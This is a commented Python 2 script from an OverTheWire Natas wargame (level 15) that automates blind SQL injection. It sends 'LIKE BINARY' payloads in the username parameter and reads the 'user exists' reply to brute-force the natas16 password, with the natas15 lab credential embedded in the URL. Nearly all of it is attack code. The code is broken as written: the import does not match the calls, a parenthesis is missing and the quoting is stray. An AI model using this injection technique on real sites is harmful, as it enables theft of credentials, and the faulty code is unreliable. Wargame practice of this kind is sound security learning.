# After confirming that the “natas16” user does indeed exist by using the provided tool 
# on the website, I created a SQL statement which could be entered into the url bar, 
# and brute force the password. However, this would take a exorbitant amount of time, 
# so I created a script that would automate the process. 
#
# The SQL Statement to be automated: 
# 
# SELECT * FROM users WHERE username="natas16" AND password LIKE BINARY "%a%"
#
# This statement selects all vaules from the users table where the username value is "natas16" and the 
# password contains an ascII character. The LIKE flag will compare the vaules one by one and the BINARY 
# flag indicates a case-sensitive comparison will be employed. 

# import requests library and request function along with the string library
from requests import request
import string

# Global variables and expressions:

# The target URL (you have to acctually go to the site and enter the username and password found in 
# level 14, otherwise it will not be able to authenticate).
url = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'

# Verify that the “user exists" confirmation string is being displayed on the page.
confirm = "This user exists."

# variable holding all possible ASCII characters
allAscii = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# To reduce the time and effort involved in the brute force attack, we can first use SQL injection to 
# find all characters used in any order in the password table.

# Empty variable to store all ASCII characters found in the password table.
foundAscii = ''

# Empty variable to store the final password
finalPswrd = ''

# First for loop:

# Use a for loop with the local variable 'a' to search through all of the ASCII characters.
# The logic in the for loop body will confirm that the characters exist in the password string and add
# them to the "foundAscii" global variable to be used in the second step.
for a in allAscii:

	# Use the request GET function to acquire the value in the password table that is associated with the 
	# "natas16" username in the database. Use the LIKE and BINARY flags to execute a one-by-one, 
	# case-sensitive search of the value in the passowrd table.
	r = requests.get(url+'?username=natas16" AND password LIKE BINARY "%'+a+'%" "'

	# Use the request content fucntion and the previously set confirm variable to confirm that the massage:
	# "This user exists." is being displayed on the page, thus confirming that the password contains 'a'.
	if r.content.find(confirm) != -1:  

		# Append all matching values to the previously defined foundAscii variable.
		foundAscii += a

# Second for loop:

# Use a for loop with the local variable b along with range() function to iterate over a 32 int range.
# The logic in the for loop body will use an additional nested for loop to iterate through all of the 
# values stored in the global variable "foundAscii".
for b in range(32):

	# nested for loop to search through the contents of "foundAscii" in conjunction with the 1st loop.
	for a in foundAscii:

		# Use the requests get function to acquire the value in the password table that is associated with 
		# the "natas16" username in the database and append it to the "finalpswrd" global variable.
		r = requests.get(url+'?username=natas16" AND password LIKE BINARY "' + finalPswrd + a + '%" "')

		# Use the requests content function to confirm the password value is correct by confirming that the 
		# "This user exists." (stored in global variable "confirm") message is being displayed.
		if r.content.find(confirm) != -1: 

			# If the above conditiona has been met, append the character value to the GV "finalPswrd".
			finalPswrd += a

			# When finished, print out the vaule stored in the GV "finalPswrd".
			# The length is set as 32 minus the length of the final password.
			print 'The Password Is: ' + finalPswrd + '*' * int(32 - len(finalPswrd))

# FINISHED

